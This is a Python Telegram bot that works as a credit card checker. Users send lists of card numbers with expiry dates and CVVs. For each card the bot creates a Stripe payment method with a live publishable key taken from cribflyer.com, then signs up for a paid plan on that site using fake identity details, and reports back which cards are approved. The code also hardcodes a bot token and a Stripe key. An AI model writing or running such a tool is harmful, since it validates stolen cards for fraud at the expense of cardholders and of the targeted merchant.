import os
import re
import time
import random
import string
import threading
import requests
import telebot

BOT_TOKEN = '7634693376:AAGzz0nE7BfOR2XE7gyWGB6s4ycAL8pOUqY'
bot = telebot.TeleBot(BOT_TOKEN)

user_stop_flag = {}

def random_email():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{username}@gmail.com"

def parse_cards(text):
    cards = []
    lines = text.replace('/', '|').splitlines()
    for line in lines:
        parts = [p.strip().replace(' ', '') for p in line.split('|')]
        if len(parts) == 4:
            cc, mm, yy, cvv = parts
            if len(yy) == 2:
                yy = '20' + yy
            if all(p.isdigit() for p in [cc, mm, yy, cvv]):
                cards.append((cc, mm, yy, cvv))
    return cards

@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.send_message(
        message.chat.id,
        "👋 Welcome! Send credit cards in one of these formats (one per line):\n"
        "`CC|MM|YY|CVV`\n"
        "`CC|MM|YYYY|CVV`\n"
        "`CC/MM/YY/CVV`\n"
        "`CC/MM/YYYY/CVV`\n\n"
        "Send /stop anytime to cancel checking.",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['stop'])
def stop_handler(message):
    user_stop_flag[message.from_user.id] = True
    bot.send_message(message.chat.id, "⏹️ Checking stopped.")

def check_card_flow(message, cards):
    user_id = message.from_user.id
    chat_id = message.chat.id
    user_stop_flag[user_id] = False
    for idx, (cc, mm, yy, cvv) in enumerate(cards, 1):
        if user_stop_flag.get(user_id):
            bot.send_message(chat_id, "⏹️ Checking stopped by user.")
            break

        email = random_email()
        name = "John Doe"
        firstname = "John"
        lastname = "Doe"
        password = "War112233$%"
        phone = "3144640037"

        stripe_payload = {
            "billing_details[name]": name,
            "billing_details[email]": email,
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_year]": yy[-2:],  # Stripe expects 2-digit year
            "card[exp_month]": mm,
            "allow_redisplay": "unspecified",
            "pasted_fields": "number",
            "payment_user_agent": "stripe.js/9e39ef88d1; stripe-js-v3/9e39ef88d1; payment-element; deferred-intent",
            "referrer": "https://www.cribflyer.com",
            "time_on_page": str(random.randint(10000, 99999)),
            "client_attribution_metadata[client_session_id]": ''.join(random.choices(string.hexdigits, k=36)),
            "client_attribution_metadata[merchant_integration_source]": "elements",
            "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
            "client_attribution_metadata[merchant_integration_version]": "2021",
            "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
            "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
            "guid": ''.join(random.choices(string.hexdigits, k=32)),
            "muid": ''.join(random.choices(string.hexdigits, k=32)),
            "sid": ''.join(random.choices(string.hexdigits, k=32)),
            "key": "pk_live_QzBMW6gThdrTmOZ1k4lPJtSU",
        }
        try:
            stripe_resp = requests.post(
                "https://api.stripe.com/v1/payment_methods",
                data=stripe_payload,
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0"
                },
                timeout=30
            )
            stripe_json = stripe_resp.json()
        except Exception as e:
            bot.send_message(chat_id, f"❌ Error with Stripe: {e}")
            continue

        pm_id = stripe_json.get("id", "")
        if not pm_id or not pm_id.startswith("pm_"):
            bot.send_message(chat_id, f"❌ Stripe error for card {cc}: {stripe_json}")
            continue

        crib_payload = {
            "email": email,
            "name": name,
            "firstname": firstname,
            "lastname": lastname,
            "password": password,
            "confpassword": password,
            "product": "property_plan",
            "qty": "1",
            "pmid": pm_id
        }
        try:
            crib_resp = requests.post(
                "https://www.cribflyer.com/signup/api",
                data=crib_payload,
                headers={
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "User-Agent": "Mozilla/5.0"
                },
                timeout=30
            )
            crib_json = crib_resp.json()
            crib_text = crib_resp.text
        except Exception as e:
            bot.send_message(chat_id, f"❌ Error with CribFlyer: {e}")
            continue

        error_value = crib_json.get("ERROR")
        if error_value is False:
            status = "✅ Approved"
        else:
            status = "❌ Failure"

        bot.send_message(
            chat_id,
            f"Card {idx}/{len(cards)}: {cc}|{mm}|{yy}|{cvv}\n"
            f"Status: {status}\n"
            f"Response:\n<code>{crib_text}</code>",
            parse_mode="HTML"
        )

        if idx < len(cards):
            for i in range(15, 0, -1):
                if user_stop_flag.get(user_id):
                    bot.send_message(chat_id, "⏹️ Checking stopped by user.")
                    return
                bot.send_chat_action(chat_id, 'typing')
                time.sleep(1)

@bot.message_handler(commands=['start'])
def start_command(message):
    bot.send_message(
        message.chat.id,
        "👋 Welcome! Send credit cards in one of these formats (one per line):\n"
        "`CC|MM|YY|CVV`\n"
        "`CC|MM|YYYY|CVV`\n"
        "`CC/MM/YY/CVV`\n"
        "`CC/MM/YYYY/CVV`\n\n"
        "Send /stop anytime to cancel checking.",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['stop'])
def stop_command(message):
    user_stop_flag[message.from_user.id] = True
    bot.send_message(message.chat.id, "⏹️ Checking stopped.")

@bot.message_handler(func=lambda m: True)
def card_handler(message):
    # Ignore commands except /start and /stop
    if message.text and message.text.strip().startswith('/') and message.text.lower() not in ['/start', '/stop']:
        return

    cards = parse_cards(message.text)
    if not cards:
        bot.send_message(
            message.chat.id,
            "❌ Format not recognized. Please send cards as:\n"
            "`CC|MM|YY|CVV`\n"
            "`CC|MM|YYYY|CVV`\n"
            "`CC/MM/YY/CVV`\n"
            "`CC/MM/YYYY/CVV`",
            parse_mode="Markdown"
        )
        return

    bot.send_message(message.chat.id, f"🔍 Checking {len(cards)} card(s)... (send /stop to cancel)")
    threading.Thread(target=check_card_flow, args=(message, cards)).start()

if __name__ == '__main__':
    bot.infinity_polling()